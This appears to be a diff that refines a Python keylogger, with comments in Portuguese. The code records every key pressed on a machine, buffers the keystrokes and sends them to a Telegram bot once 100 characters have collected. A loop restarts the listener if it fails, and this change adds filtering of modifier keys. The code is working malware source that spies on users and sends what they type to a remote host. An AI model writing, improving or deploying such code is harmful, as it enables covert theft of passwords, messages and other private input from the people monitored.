@@ -12,7 +12,6 @@ def send_to_telegram(text):
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         payload = {"chat_id": CHAT_ID, "text": text}
         try:
-            # Adicionado timeout=10 para o script não travar se a rede falhar
             requests.post(url, data=payload, timeout=10)
         except:
             pass
@@ -20,8 +19,10 @@ def send_to_telegram(text):
 def on_press(key):
     global buffer
     try:
+        # Tenta pegar o caractere da tecla (letras, números, símbolos)
         buffer += key.char
     except AttributeError:
+        # Aqui tratamos as teclas especiais
         if key == Key.space:
             buffer += " "
         elif key == Key.enter:
@@ -31,15 +32,17 @@ def on_press(key):
             buffer = buffer[:-1]
         elif key == Key.tab:
             buffer += " [TAB] "
+        elif key == Key.caps_lock:
+            pass 
+        elif key == Key.shift or key == Key.shift_r or key == Key.ctrl or key == Key.ctrl_l or key == Key.alt or key == Key.alt_gr:
+            pass 
         else:
             buffer += f" [{key}] "
 
-    # Envio automático se o buffer ficar muito grande (evita perda de dados)
     if len(buffer) > 100:
         send_to_telegram(buffer)
         buffer = ""
 
-# Loop infinito: Se o monitoramento cair por qualquer motivo, ele reinicia em 10 segundos
 while True:
     try:
         with Listener(on_press=on_press) as listener:
